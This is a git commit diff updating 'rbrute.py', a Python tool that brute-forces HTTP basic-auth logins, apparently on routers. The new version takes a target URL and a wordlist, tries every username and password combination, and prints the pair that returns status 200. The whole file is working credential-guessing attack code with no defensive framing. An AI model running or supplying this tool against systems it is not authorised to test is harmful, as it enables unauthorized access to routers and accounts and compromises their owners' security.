0380552a21891fede3f39b0840656f507b275093
Anikin Luke Abales <47096239+abalesluke@users.noreply.github.com>
2021-03-04 06:26:07 +0800

    Update rbrute.py

--- rbrute.py
+++ rbrute.py
@@ -1,50 +1,77 @@
-import requests, sys, os, re
+#!/usr/bin/python
+# coding: utf-8
+import requests, sys, os, re, optparse, time
+
+read = optparse.OptionParser()
+read.add_option('-t', '--target',dest='url',help='Enter Target ip/url')
+read.add_option('-w', '--wordlist',dest='WORDLIST',help='Enter wordlist path')
+read.add_option('-v', '--verbose',action='store_true',dest='verbose',default=False,help='VERBOSE')
+
+(values, key) = read.parse_args()
+url = values.url
+
+WORDLIST = values.WORDLIST
+verbose = values.verbose
+
+if verbose == True:
+    verbose = 0
+else:
+    verbose = .5
+
 
 pattern = r'http'
 pat = r's'
-url = raw_input('Enter router ip: ')
+try:
 
-if re.match(pattern, url):
-    url = re.sub(pat,'',url)
-    pass
-else:
-    url = 'http://'+url
-
-
-def data():
-    uzerl = open('list.txt','r')
-    paszl = open('list.txt','r')
-    uzer = uzerl.read().splitlines()
-    pasz = paszl.read().splitlines()
-    return uzer, pasz
+    if re.match(pattern, url):
+        url = re.sub(pat,'',url)
+        pass
+    else:
+        url = 'http://'+url
 
 
-uzer, pasz = data()
+    def data():
+        uzerl = open(WORDLIST, 'r')
+        paszl = open(WORDLIST, 'r')
+        uzer = uzerl.read().splitlines()
+        pasz = paszl.read().splitlines()
+        return uzer, pasz
 
-for user in uzer:
-    for password in pasz:
-        r = requests.get(url,auth=(user,password))
-        status = r.status_code
-        print "============AL104=============="
-        print "code: ",status
-        print "User: "+user
-        print "Password: "+password
-        print "============AL104=============="
-        if(status == 200):
+    
+    uzer, pasz = data()
 
-            print"[----------------------------------------]"
-            print"[============PASSWORD-FOUND==============]"
-            print"          status = ",status                    
-            print"          User: "+user                       
-            print"          Password: "+password
-            print"[=================AL104==================]"
-            sys.exit()
+    for user in uzer:
+        for password in pasz:
+            time.sleep(verbose)
+            r = requests.get(url,auth=(user,password))
+            status = r.status_code
+            print("|============AL104==============")
+            print("|| code: ",status)
+            print("|| User: "+user)
+            print("|| Password: "+password)
+            print("||")
+            if(status == 200):
+                os.system('clear')
+                print("-------------------------------------------")
+                print("<<<<<<<<<<<<<<<<---------->>>>>>>>>>>>>>>>>")
+                print("||============PASSWORD-FOUND============>>>")
+                print("|| status = ",status)                    
+                print("|| User: "+user)                       
+                print("|| Password: "+password)
+                print("||")
+                print("||=================AL104================>>>")
+                print("<<<<<<<<<<<<<<<<<<---------->>>>>>>>>>>>>>>")
+                print("-------------------------------------------")
+                sys.exit()
 
-os.system("clear")
-print
-print
-print("PASSWORD NOT FOUND!!")
-print("ERROR!!")
-print("user/password may not be on wordlist!!")
-print("pls use or create another wordlist")
+    os.system("clear")
+    print
+    print
+    print("PASSWORD NOT FOUND!!")
+    print("ERROR!!")
+    print("user/password may not be on wordlist!!")
+    print("pls use or create another wordlist")
+
+except TypeError:
+    os.system('rbrute -h')
 
